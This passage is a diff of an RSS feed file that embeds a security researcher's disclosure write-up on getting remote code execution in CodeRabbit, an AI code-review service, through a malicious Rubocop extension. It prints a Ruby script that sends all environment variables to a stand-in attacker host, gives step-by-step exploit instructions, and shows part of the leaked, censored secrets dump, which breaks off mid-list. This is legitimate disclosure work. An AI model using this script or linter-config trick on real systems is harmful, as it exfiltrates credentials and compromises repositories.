@@ -4,12 +4,921 @@
         <title>HN100 - Readable Contents</title>
         <link>https://hn.algolia.com/api/v1/search_by_date?tags=%28story,poll%29&amp;numericFilters=points%3E100</link>
         <description>Uses Readability to add bodies to the RSS feed</description>
-        <lastBuildDate>Tue, 19 Aug 2025 17:30:01 GMT</lastBuildDate>
+        <lastBuildDate>Tue, 19 Aug 2025 18:30:02 GMT</lastBuildDate>
         <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
         <generator>https://github.com/jpmonette/feed</generator>
         <language>en</language>
         <item>
-            <title><![CDATA[Chrome intends to remove XSLT from the HTML spec (214 pts)]]></title>
+            <title><![CDATA[How we exploited CodeRabbit: From simple PR to RCE and write access on 1M repos (141 pts)]]></title>
+            <link>https://research.kudelskisecurity.com/2025/08/19/how-we-exploited-coderabbit-from-a-simple-pr-to-rce-and-write-access-on-1m-repositories/</link>
+            <guid>44953032</guid>
+            <pubDate>Tue, 19 Aug 2025 15:55:15 GMT</pubDate>
+            <description><![CDATA[<p>URL: <a href="https://research.kudelskisecurity.com/2025/08/19/how-we-exploited-coderabbit-from-a-simple-pr-to-rce-and-write-access-on-1m-repositories/">https://research.kudelskisecurity.com/2025/08/19/how-we-exploited-coderabbit-from-a-simple-pr-to-rce-and-write-access-on-1m-repositories/</a>, See on <a href="https://news.ycombinator.com/item?id=44953032">Hacker News</a></p>
+<div id="readability-page-1" class="page"><div>
+
+		
+<p>In this blog post, we explain how we got remote code execution (RCE) on CodeRabbit’s production servers, leaked their API tokens and secrets, how we could have accessed their PostgreSQL database, and how we obtained read and write access to 1 million code repositories, including private ones.</p>
+
+
+
+<p>This blog post is a detailed write-up of one of the vulnerabilities we disclosed at <a href="https://research.kudelskisecurity.com/2025/08/07/hack-to-the-future-slides-and-content/">Black Hat USA</a> this year. The details provided in this post are meant to demonstrate how these security issues can manifest and be exploited in the hopes that others can avoid similar issues. This is not meant to shame any particular vendor; it happens to everyone. Security is a process, and avoiding vulnerabilities takes constant vigilance. </p>
+
+
+
+<p><strong>Note:</strong> <strong>The security issues documented in this post were remediated in January of 2025.</strong> See the Responsible Disclosure section for more details. </p>
+
+
+
+<h2>Introduction</h2>
+
+
+
+<p>Last December, I spoke at 38C3 in Hamburg and <a href="https://research.kudelskisecurity.com/2024/08/29/careful-where-you-code-multiple-vulnerabilities-in-ai-powered-pr-agent/">covered 2 security flaws</a> I discovered in Qodo Merge. After getting off the stage, someone came to me and asked whether I had looked at other AI code review tools, such as CodeRabbit. I thanked them and said this would be a great target to have a look at. Fast forward a couple of weeks, and here I am, having a look at their security.</p>
+
+
+
+<h2>What is CodeRabbit?</h2>
+
+
+
+<figure><a href="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-17-144947_2338x669_scrot.png"><img data-attachment-id="20091" data-permalink="https://research.kudelskisecurity.com/2025/08/19/how-we-exploited-coderabbit-from-a-simple-pr-to-rce-and-write-access-on-1m-repositories/2025-01-17-144947_2338x669_scrot/" data-orig-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-17-144947_2338x669_scrot.png" data-orig-size="2338,669" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="2025-01-17-144947_2338x669_scrot" data-image-description="" data-image-caption="" data-medium-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-17-144947_2338x669_scrot.png?w=300" data-large-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-17-144947_2338x669_scrot.png?w=840" width="1024" height="293" src="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-17-144947_2338x669_scrot.png?w=1024" alt=""></a><figcaption>CodeRabbit front page</figcaption></figure>
+
+
+
+<p><a href="https://www.coderabbit.ai/">CodeRabbit</a> is an AI code review tool. Their website mentions it’s the most installed <a href="https://github.com/marketplace?type=apps&amp;category=ai-assisted">AI app on GitHub</a> &amp; Gitlab, with 1 million repositories in review and 5 million pull requests reviewed.</p>
+
+
+
+<figure><a href="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-17-145000_3457x598_scrot.png"><img data-attachment-id="20093" data-permalink="https://research.kudelskisecurity.com/2025/08/19/how-we-exploited-coderabbit-from-a-simple-pr-to-rce-and-write-access-on-1m-repositories/2025-01-17-145000_3457x598_scrot/" data-orig-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-17-145000_3457x598_scrot.png" data-orig-size="3457,598" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="2025-01-17-145000_3457x598_scrot" data-image-description="" data-image-caption="" data-medium-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-17-145000_3457x598_scrot.png?w=300" data-large-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-17-145000_3457x598_scrot.png?w=840" width="1024" height="177" src="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-17-145000_3457x598_scrot.png?w=1024" alt=""></a><figcaption>1 million repositories in review</figcaption></figure>
+
+
+
+<p>Indeed, CodeRabbit is the most installed GitHub app in the AI Assisted category on GitHub Marketplace. It is also on the first page of the most installed GitHub apps overall across all categories on <a href="https://github.com/marketplace?type=apps">GitHub Marketplace</a>.</p>
+
+
+
+<figure><a href="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250721_14h36m44s_grim.png"><img data-attachment-id="20810" data-permalink="https://research.kudelskisecurity.com/2025/08/19/how-we-exploited-coderabbit-from-a-simple-pr-to-rce-and-write-access-on-1m-repositories/20250721_14h36m44s_grim/" data-orig-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250721_14h36m44s_grim.png" data-orig-size="3315,1526" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="20250721_14h36m44s_grim" data-image-description="" data-image-caption="" data-medium-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250721_14h36m44s_grim.png?w=300" data-large-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250721_14h36m44s_grim.png?w=840" loading="lazy" width="1024" height="471" src="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250721_14h36m44s_grim.png?w=1024" alt=""></a><figcaption>CodeRabbit is the most installed AI-assisted app on GitHub marketplace</figcaption></figure>
+
+
+
+<p>Once CodeRabbit is installed on a repository, every time a new pull request (PR) is created or updated, CodeRabbit will analyze the code changes in the PR and review them using AI. CodeRabbit will finally post its code review as a comment on the pull request, where the developer can read it.</p>
+
+
+
+<p>This is a very useful developer productivity tool that can summarize PRs, find security issues in the code, suggest code improvements or even document the code or illustrate it by generating diagrams. It can save developers a lot of time.</p>
+
+
+
+<h2>Trying out CodeRabbit</h2>
+
+
+
+<p>CodeRabbit has multiple pricing plans, and one of them is called Pro. That one includes support for linters and SAST tools, such as Semgrep. Alternatively, there’s a free 14-day trial for the Pro plan. Also, the Pro plan comes for free for people working on open source projects.</p>
+
+
+
+<figure><a href="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-22-142418_1445x846_scrot.png"><img data-attachment-id="20096" data-permalink="https://research.kudelskisecurity.com/2025/08/19/how-we-exploited-coderabbit-from-a-simple-pr-to-rce-and-write-access-on-1m-repositories/2025-01-22-142418_1445x846_scrot/" data-orig-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-22-142418_1445x846_scrot.png" data-orig-size="1445,846" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="2025-01-22-142418_1445x846_scrot" data-image-description="" data-image-caption="" data-medium-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-22-142418_1445x846_scrot.png?w=300" data-large-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-22-142418_1445x846_scrot.png?w=840" loading="lazy" width="1024" height="599" src="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-22-142418_1445x846_scrot.png?w=1024" alt=""></a><figcaption>CodeRabbit pricing</figcaption></figure>
+
+
+
+<p>I registered for the free trial and logged in using my GitHub account.</p>
+
+
+<div>
+<figure><a href="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-21-100901_1363x1123_scrot.png"><img data-attachment-id="20116" data-permalink="https://research.kudelskisecurity.com/2025/08/19/how-we-exploited-coderabbit-from-a-simple-pr-to-rce-and-write-access-on-1m-repositories/2025-01-21-100901_1363x1123_scrot/" data-orig-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-21-100901_1363x1123_scrot.png" data-orig-size="1363,1123" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="2025-01-21-100901_1363x1123_scrot" data-image-description="" data-image-caption="" data-medium-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-21-100901_1363x1123_scrot.png?w=300" data-large-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-21-100901_1363x1123_scrot.png?w=840" loading="lazy" width="1024" height="843" src="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-21-100901_1363x1123_scrot.png?w=1024" alt=""></a><figcaption>Login with GitHub</figcaption></figure></div>
+
+
+<p>When first logging into CodeRabbit using GitHub, the application asks to install and authorize on a personal GitHub account. The user is asked to select which repositories CodeRabbit should be installed to. The user can also review the permissions that the CodeRabbit GitHub app will be granted. Namely, read and write access to code in the selected repositories.</p>
+
+
+<div>
+<figure><a href="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-16-154845_655x833_scrot.png"><img data-attachment-id="20100" data-permalink="https://research.kudelskisecurity.com/2025/08/19/how-we-exploited-coderabbit-from-a-simple-pr-to-rce-and-write-access-on-1m-repositories/2025-01-16-154845_655x833_scrot/" data-orig-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-16-154845_655x833_scrot.png" data-orig-size="655,833" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="2025-01-16-154845_655x833_scrot" data-image-description="" data-image-caption="" data-medium-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-16-154845_655x833_scrot.png?w=236" data-large-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-16-154845_655x833_scrot.png?w=655" loading="lazy" width="655" height="833" src="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-16-154845_655x833_scrot.png?w=655" alt=""></a><figcaption>Installing CodeRabbit on a personal GitHub account</figcaption></figure></div>
+
+
+<p>At this point, this sounded very similar to what happened with Qodo Merge. I had to look into it. If somehow we could leak the GitHub API token, we would get read and write access to the repository in which CodeRabbit was installed.</p>
+
+
+
+<p>I immediately created a private GitHub repository on my personal GitHub account and granted CodeRabbit access to that new repository so that it starts reviewing my PRs on that repo.</p>
+
+
+
+<p>In order to get more familiar with CodeRabbit’s features and how to use them, I created a PR and saw that a comment containing a code review was posted by the CodeRabbit bot. Here are a few screenshots of what CodeRabbit generated.</p>
+
+
+
+<figure><a href="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250728_17h02m19s_grim.png"><img data-attachment-id="20819" data-permalink="https://research.kudelskisecurity.com/2025/08/19/how-we-exploited-coderabbit-from-a-simple-pr-to-rce-and-write-access-on-1m-repositories/20250728_17h02m19s_grim/" data-orig-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250728_17h02m19s_grim.png" data-orig-size="1270,462" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="20250728_17h02m19s_grim" data-image-description="" data-image-caption="" data-medium-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250728_17h02m19s_grim.png?w=300" data-large-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250728_17h02m19s_grim.png?w=840" loading="lazy" width="1024" height="372" src="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250728_17h02m19s_grim.png?w=1024" alt=""></a><figcaption>CodeRabbit explains what the PR does</figcaption></figure>
+
+
+
+<figure><a href="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250728_17h06m52s_grim.png"><img data-attachment-id="20823" data-permalink="https://research.kudelskisecurity.com/2025/08/19/how-we-exploited-coderabbit-from-a-simple-pr-to-rce-and-write-access-on-1m-repositories/20250728_17h06m52s_grim/" data-orig-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250728_17h06m52s_grim.png" data-orig-size="1131,799" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="20250728_17h06m52s_grim" data-image-description="" data-image-caption="" data-medium-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250728_17h06m52s_grim.png?w=300" data-large-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250728_17h06m52s_grim.png?w=840" loading="lazy" width="1024" height="723" src="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250728_17h06m52s_grim.png?w=1024" alt=""></a><figcaption>CodeRabbit can find security issues in your code and suggest improvements</figcaption></figure>
+
+
+
+<figure><a href="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250728_17h02m40s_grim.png"><img data-attachment-id="20822" data-permalink="https://research.kudelskisecurity.com/2025/08/19/how-we-exploited-coderabbit-from-a-simple-pr-to-rce-and-write-access-on-1m-repositories/20250728_17h02m40s_grim/" data-orig-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250728_17h02m40s_grim.png" data-orig-size="1119,672" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="20250728_17h02m40s_grim" data-image-description="" data-image-caption="" data-medium-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250728_17h02m40s_grim.png?w=300" data-large-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250728_17h02m40s_grim.png?w=840" loading="lazy" width="1024" height="614" src="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250728_17h02m40s_grim.png?w=1024" alt=""></a><figcaption>CodeRabbit even generated a diagram that explained how the app worked</figcaption></figure>
+
+
+
+<p>Now that I had a better idea of how it worked, I could start looking for vulnerabilities. </p>
+
+
+
+<h2>Exploiting external tools</h2>
+
+
+
+<p>I had a look at the official CodeRabbit documentation and noticed that CodeRabbit supported running <a href="https://docs.coderabbit.ai/tools/">dozens of static analysis tools</a>. These are the linters and SAST tools mentioned on the CodeRabbit pricing page discussed above.</p>
+
+
+
+<p>CodeRabbit runs these tools on your PR changes depending on a few conditions:</p>
+
+
+
+<ul>
+<li>The tool is enabled in the CodeRabbit configuration</li>
+
+
+
+<li>The PR contains large enough changes to trigger a run of such tools. Small changes will be ignored and no tool will run on those</li>
+
+
+
+<li>The PR contains files supported by the tool. For example, PHPStan will only run on files with the <code>.php</code> extension</li>
+</ul>
+
+
+
+<p>Some tools are enabled by default and will run if corresponding files exist. Otherwise, a <code>.coderabbit.yaml</code> file placed in the repository can be used to configure which tools should be enabled. Alternatively, the CodeRabbit web app settings can be used to configure tools.</p>
+
+
+
+<p>The documentation page also states that each tool can be configured by providing a path to a configuration file read by the tool. Now we’re talking!</p>
+
+
+
+<p>Since CodeRabbit executes these external tools, if any of these tools have a way to inject code, we may be able to run arbitrary code. So I glanced over the list of supported tools and found an interesting target: <a href="https://docs.coderabbit.ai/tools/rubocop">Rubocop</a>, a Ruby static analyzer. The CodeRabbit documentation page for Rubocop states that Rubocop will run on Ruby files (<code>.rb</code>) in the repository. It also says that CodeRabbit will look for a <code>.rubocop.yml</code> file anywhere in the repository and pass it to Rubocop.</p>
+
+
+<div>
+<figure><a href="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250612_17h56m36s_grim.png"><img data-attachment-id="20802" data-permalink="https://research.kudelskisecurity.com/2025/08/19/how-we-exploited-coderabbit-from-a-simple-pr-to-rce-and-write-access-on-1m-repositories/20250612_17h56m36s_grim/" data-orig-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250612_17h56m36s_grim.png" data-orig-size="807,210" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="20250612_17h56m36s_grim" data-image-description="" data-image-caption="" data-medium-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250612_17h56m36s_grim.png?w=300" data-large-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250612_17h56m36s_grim.png?w=807" loading="lazy" width="807" height="210" src="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250612_17h56m36s_grim.png?w=807" alt=""></a><figcaption>Rubocop runs on Ruby files (.rb)<br>Source: CodeRabbit documentation</figcaption></figure></div>
+
+<div>
+<figure><a href="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250612_17h31m50s_grim.png"><img data-attachment-id="20805" data-permalink="https://research.kudelskisecurity.com/2025/08/19/how-we-exploited-coderabbit-from-a-simple-pr-to-rce-and-write-access-on-1m-repositories/20250612_17h31m50s_grim/" data-orig-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250612_17h31m50s_grim.png" data-orig-size="867,239" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="20250612_17h31m50s_grim" data-image-description="" data-image-caption="" data-medium-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250612_17h31m50s_grim.png?w=300" data-large-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250612_17h31m50s_grim.png?w=840" loading="lazy" width="867" height="239" src="https://research.kudelskisecurity.com/wp-content/uploads/2025/08/20250612_17h31m50s_grim.png?w=867" alt=""></a><figcaption>CodeRabbit looks for Rubocop config files anywhere in the repository and, if found, passes it to Rubocop <br>Source: CodeRabbit documentation</figcaption></figure></div>
+
+
+<p><br>Looking at Rubocop’s documentation, we see that it supports <a href="https://docs.rubocop.org/rubocop/1.69/extensions.html">extensions</a>. One can use the Rubocop configuration file to specify the path to an extension Ruby file, for example, <code>ext.rb</code>, which will be loaded and executed by Rubocop. To do so, one can include the following snippet in <code>.rubocop.yml</code>:</p>
+
+
+
+
+
+<p>In <code>ext.rb</code>, we can write arbitrary Ruby code that will be loaded and executed when Rubocop runs. We’ll use 1.2.3.4 as an example IP address that stands in for an attacker-controlled system. For example, the following Ruby script will collect the environment variables and send them to an attacker-controlled server at <code>1.2.3.4</code>:</p>
+
+
+<div><pre title="">require 'net/http'
+require 'uri'
+require 'json'
+
+# Collect environment variables
+env_vars = ENV.to_h
+
+# Convert environment variables to JSON format
+json_data = env_vars.to_json
+
+# Define the URL to send the HTTP POST request
+url = URI.parse('http://1.2.3.4/')
+
+begin
+  # Create the HTTP POST request
+  http = Net::HTTP.new(url.host, url.port)
+  request = Net::HTTP::Post.new(url.path)
+  request['Content-Type'] = 'application/json'
+  request.body = json_data
+
+  # Send the request
+  response = http.request(request)
+rescue StandardError =&gt; e
+  puts "An error occurred: #{e.message}"
+end
+</pre></div>
+
+
+<p>Exploiting this is as simple as following these steps:</p>
+
+
+
+<ul>
+<li>Get a free trial on CodeRabbit and register using a personal GitHub account</li>
+
+
+
+<li>Create a private repository and grant CodeRabbit access to it, so that it reviews PRs on that repository</li>
+
+
+
+<li>Create a PR that contains the following files:
+<ul>
+<li>A <code>.rubocop.yml</code> file as shown above</li>
+
+
+
+<li>An <code>ext.rb</code> file as shown above</li>
+
+
+
+<li>Any other large enough dummy Ruby file so that CodeRabbit triggers the execution of Rubocop and does not skip the file</li>
+</ul>
+</li>
+
+
+
+<li>Wait for CodeRabbit to perform the code review and run our malicious ext.rb file</li>
+
+
+
+<li>Collect the exfiltrated environment variables in the HTTP POST request received on our attacker-controlled server at 1.2.3.4</li>
+</ul>
+
+
+
+<p>Here’s an illustration of our malicious pull request to better understand how it works:</p>
+
+
+
+<article>
+
+
+  <div>
+
+    <!-- main.rb -->
+    <div>
+      <h3>main.rb</h3>
+      <pre><span># Contains dummy </span>
+<span># Ruby code so </span>
+<span># that Rubocop </span>
+<span># gets executed</span>
+
+puts "hello"
+      </pre>
+    </div>
+
+    <!-- .rubocop.yml -->
+    <div>
+      <h3>.rubocop.yml</h3>
+      <pre><span># Instructs </span>
+<span># Rubocop to load </span>
+<span># extension in </span>
+<span># file ext.rb</span>
+
+require:
+  ./ext.rb
+      </pre>
+    </div>
+
+    <!-- ext.rb -->
+    <div>
+      <h3>ext.rb</h3>
+      <pre><span># Malicious Ruby </span>
+<span># code goes here</span>
+<span># </span>
+<span># Example:</span>
+<span># </span>
+<span># Send all env vars </span>
+<span># to http://1.2.3.4</span>
+      </pre>
+    </div>
+
+  </div>
+
+  <!-- Legend -->
+  <p>
+    An illustration of what the malicious pull request looks like
+  </p>
+</article>
+
+
+
+<h2>Unpacking what we found</h2>
+
+
+
+<p>After we created our malicious PR, CodeRabbit ran Rubocop on our code, which executed our malicious code and sent its environment variables to our server at 1.2.3.4.</p>
+
+
+
+<p>On the server at <code>1.2.3.4</code>, the following JSON payload containing environment variables was received:</p>
+
+
+<div><pre title="">{
+  "ANTHROPIC_API_KEYS": "sk-ant-api03-(CENSORED)",
+  "ANTHROPIC_API_KEYS_FREE": "sk-ant-api03-(CENSORED)",
+  "ANTHROPIC_API_KEYS_OSS": "sk-ant-api03-(CENSORED)",
+  "ANTHROPIC_API_KEYS_PAID": "sk-ant-api03-(CENSORED)",
+  "ANTHROPIC_API_KEYS_TRIAL": "sk-ant-api03-(CENSORED)",
+  "APERTURE_AGENT_ADDRESS": "(CENSORED)",
+  "APERTURE_AGENT_KEY": "(CENSORED)",
+  "AST_GREP_ESSENTIALS": "ast-grep-essentials",
+  "AST_GREP_RULES_PATH": "/home/jailuser/ast-grep-rules",
+  "AWS_ACCESS_KEY_ID": "",
+  "AWS_REGION": "",
+  "AWS_SECRET_ACCESS_KEY": "",
+  "AZURE_GPT4OMINI_DEPLOYMENT_NAME": "",
+  "AZURE_GPT4O_DEPLOYMENT_NAME": "",
+  "AZURE_GPT4TURBO_DEPLOYMENT_NAME": "",
+  "AZURE_O1MINI_DEPLOYMENT_NAME": "",
+  "AZURE_O1_DEPLOYMENT_NAME": "",
+  "AZURE_OPENAI_API_KEY": "",
+  "AZURE_OPENAI_ENDPOINT": "",
+  "AZURE_OPENAI_ORG_ID": "",
+  "AZURE_OPENAI_PROJECT_ID": "",
+  "BITBUCKET_SERVER_BOT_TOKEN": "",
+  "BITBUCKET_SERVER_BOT_USERNAME": "",
+  "BITBUCKET_SERVER_URL": "",
+  "BITBUCKET_SERVER_WEBHOOK_SECRET": "",
+  "BUNDLER_ORIG_BUNDLER_VERSION": "BUNDLER_ENVIRONMENT_PRESERVER_INTENTIONALLY_NIL",
+  "BUNDLER_ORIG_BUNDLE_BIN_PATH": "BUNDLER_ENVIRONMENT_PRESERVER_INTENTIONALLY_NIL",
+  "BUNDLER_ORIG_BUNDLE_GEMFILE": "BUNDLER_ENVIRONMENT_PRESERVER_INTENTIONALLY_NIL",
+  "BUNDLER_ORIG_GEM_HOME": "BUNDLER_ENVIRONMENT_PRESERVER_INTENTIONALLY_NIL",
+  "BUNDLER_ORIG_GEM_PATH": "BUNDLER_ENVIRONMENT_PRESERVER_INTENTIONALLY_NIL",
+  "BUNDLER_ORIG_MANPATH": "BUNDLER_ENVIRONMENT_PRESERVER_INTENTIONALLY_NIL",
+  "BUNDLER_ORIG_PATH": "/pnpm:/usr/local/go/bin:/root/.local/bin:/swift/usr/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
+  "BUNDLER_ORIG_RB_USER_INSTALL": "BUNDLER_ENVIRONMENT_PRESERVER_INTENTIONALLY_NIL",
+  "BUNDLER_ORIG_RUBYLIB": "BUNDLER_ENVIRONMENT_PRESERVER_INTENTIONALLY_NIL",
+  "BUNDLER_ORIG_RUBYOPT": "BUNDLER_ENVIRONMENT_PRESERVER_INTENTIONALLY_NIL",
+  "CI": "true",
+  "CLOUD_API_URL": "https://(CENSORED)",
+  "CLOUD_RUN_TIMEOUT_SECONDS": "3600",
+  "CODEBASE_VERIFICATION": "true",
+  "CODERABBIT_API_KEY": "",
+  "CODERABBIT_API_URL": "https://(CENSORED)",
+  "COURIER_NOTIFICATION_AUTH_TOKEN": "(CENSORED)",
+  "COURIER_NOTIFICATION_ID": "(CENSORED)",
+  "DB_API_URL": " https://(CENSORED)",
+  "ENABLE_APERTURE": "true",
+  "ENABLE_DOCSTRINGS": "true",
+  "ENABLE_EVAL": "false",
+  "ENABLE_LEARNINGS": "",
+  "ENABLE_METRICS": "",
+  "ENCRYPTION_PASSWORD": "(CENSORED)",
+  "ENCRYPTION_SALT": "(CENSORED)",
+  "FIREBASE_DB_ID": "",
+  "FREE_UPGRADE_UNTIL": "2025-01-15",
+  "GH_WEBHOOK_SECRET": "(CENSORED)",
+  "GITHUB_APP_CLIENT_ID": "(CENSORED)",
+  "GITHUB_APP_CLIENT_SECRET": "(CENSORED)",
+  "GITHUB_APP_ID": "(CENSORED)",
